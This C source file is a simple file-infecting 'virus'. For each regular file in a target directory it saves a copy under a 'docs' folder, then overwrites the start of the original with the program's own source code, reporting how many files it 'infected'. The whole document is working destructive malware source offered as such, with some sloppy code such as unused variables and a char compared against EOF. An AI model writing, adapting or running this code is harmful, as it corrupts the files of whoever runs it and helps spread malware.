#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <sys/stat.h>  // For mkdir()

FILE *virus, *host;
int infected_files = 0;

unsigned long x;
char buffer[2048];
clock_t start, end;

void infect_file(const char *filepath) {
    char ch;
    // Open the virus source file (you may need to adjust this path)
    virus = fopen(__FILE__, "rb"); // Replace with actual virus binary if needed
    if (virus == NULL) {
        printf("Error opening virus file.\n");
        return;
    }

    // Open the target file to corrupt (host file)
    host = fopen(filepath, "rb+");
    FILE *host_copy = fopen(filepath, "r");
    if (host == NULL || host_copy == NULL) {
        printf("Error opening host file: %s\n", filepath);
        fclose(virus);
        return;
    }

    // Extract the filename from the full path
    const char *filename = strrchr(filepath, '/');
    if (filename) {
        filename++;  // Move past the '/' character to get just the filename
    } else {
        filename = filepath;  // If no '/' in filepath, it is just the filename
    }

    // Create folder if it doesn't exist
    DIR *dir = opendir("docs");
    if (!dir) {
        if (mkdir("docs", 0777) != 0) {
            printf("Error creating 'docs' directory.\n");
            fclose(virus);
            fclose(host);
            fclose(host_copy);
            return;
        }
    } else {
        closedir(dir);
    }

    // Create the new file in "docs"
    char dest_path[1024];
    snprintf(dest_path, sizeof(dest_path), "docs/%s_copy.txt", filename);
    FILE *output = fopen(dest_path, "w");
    if (!output) {
        printf("Error creating output file: %s\n", dest_path);
        fclose(virus);
        fclose(host);
        fclose(host_copy);
        return;
    }

    // Copy file contents into a new file
    while ((ch = fgetc(host_copy)) != EOF) {
        fputc(ch, output);
    }

    x = 89088; // Arbitrary size to copy
    printf("Infecting %s\n", filepath);
    while ((ch = fgetc(virus)) != EOF) {
        fputc(ch, host);
    }

    infected_files++;

    // Close all open files
    fclose(host);
    fclose(virus);
    fclose(output);
    fclose(host_copy);
}

int main(int argc, char *argv[]) {
    struct dirent *entry;
    DIR *dir;
    char filepath[1024];

    // If a directory is specified as an argument, use it; otherwise, use the current directory
    const char *directory = (argc > 1) ? argv[1] : ".";

    // Open the specified directory
    dir = opendir(directory);
    if (dir == NULL) {
        printf("Error opening directory: %s\n", directory);
        return 1;
    }

    start = clock();

    // Loop through all files in the directory
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) { // Only process regular files
            // Construct the full path to the file
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);
            infect_file(filepath);
        }
    }

    closedir(dir);

    end = clock();
    printf("DONE! (Total Files Infected = %d)\n", infected_files);
    printf("TIME TAKEN = %f SEC\n", (double)(end - start) / CLOCKS_PER_SEC);

    return 0;
}
